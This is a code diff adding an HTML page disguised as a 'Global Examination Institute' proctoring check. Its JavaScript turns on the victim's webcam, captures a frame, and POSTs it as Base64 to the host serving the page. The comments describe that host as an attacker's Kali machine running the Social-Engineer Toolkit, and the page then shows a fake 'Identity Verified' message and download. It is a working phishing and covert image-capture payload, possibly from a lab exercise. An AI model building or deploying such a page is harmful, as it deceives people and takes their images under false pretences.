@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Candidate Verification | Global Examination Institute</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f9; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 450px; text-align: center; border-top: 6px solid #2c3e50; }
+        .logo { width: 70px; margin-bottom: 20px; }
+        h1 { color: #2c3e50; font-size: 22px; margin-bottom: 10px; }
+        p { color: #5f676d; font-size: 15px; line-height: 1.5; margin-bottom: 25px; }
+        .btn { background-color: #007bff; color: white; padding: 14px 28px; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.3s; width: 100%; }
+        .btn:hover { background-color: #0056b3; }
+        #video-container { margin-top: 20px; display: none; }
+        video { width: 100%; border-radius: 8px; border: 2px solid #ddd; background: #000; }
+        .footer-note { font-size: 11px; color: #999; margin-top: 20px; }
+        .shield-icon { color: #27ae60; font-size: 12px; font-weight: bold; margin-bottom: 5px; display: block; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://cdn-icons-png.flaticon.com/512/9114/9114515.png" class="logo" alt="Security Logo">
+    <span class="shield-icon">✓ SECURE CONNECTION ACTIVE</span>
+    <h1>Identity Verification</h1>
+    <p>Welcome, Candidate. To access the <b>Cybersecurity Practice Exam</b> and download your <b>Pre-Certification Guide</b>, please complete the mandatory live proctoring check.</p>
+    
+    <button class="btn" id="verifyBtn">Enable Camera & Verify Identity</button>
+
+    <div id="video-container">
+        <video id="webcam" autoplay></video>
+        <p style="color: #27ae60; font-weight: bold; margin-top: 10px;">Analyzing Biometrics... Please wait.</p>
+    </div>
+
+    <div class="footer-note">
+        By clicking, you consent to a one-time hardware check for proctoring purposes. 
+        Authorized by the Global Examination Standards Board 2026.
+    </div>
+</div>
+
+<script>
+    const verifyBtn = document.getElementById('verifyBtn'); // Use the ID from your button
+    const video = document.getElementById('webcam'); // Use the ID from your video tag
+
+    verifyBtn.addEventListener('click', async () => {
+        try {
+            // 1. Trigger Camera Access
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            
+            // Show the video feed so they think it's a real "scan"
+            document.getElementById('video-container').style.display = 'block';
+
+            // 2. THE CAPTURE LOGIC (Add this part)
+            // Wait 2 seconds for the camera to focus, then take the "shot"
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                // Convert image to a text string (Base64)
+                const imageData = canvas.toDataURL('image/png');
+                
+                // 3. THE EXFILTRATION (Sending it to SET)
+                // This sends the image data as a POST request back to your Kali machine
+                fetch('/', {
+                    method: 'POST',
+                    body: "CAPTURED_FRAME=" + imageData
+                });
+
+                alert("Identity Verified Successfully. Your PDF Study Guide is downloading now.");
+                window.location.href = "study_guide.pdf";
+            }, 2000);
+
+        } catch (err) {
+            alert("Security Error: Camera access is mandatory.");
+        }
+    });
+</script>
+
+</body>
+</html>
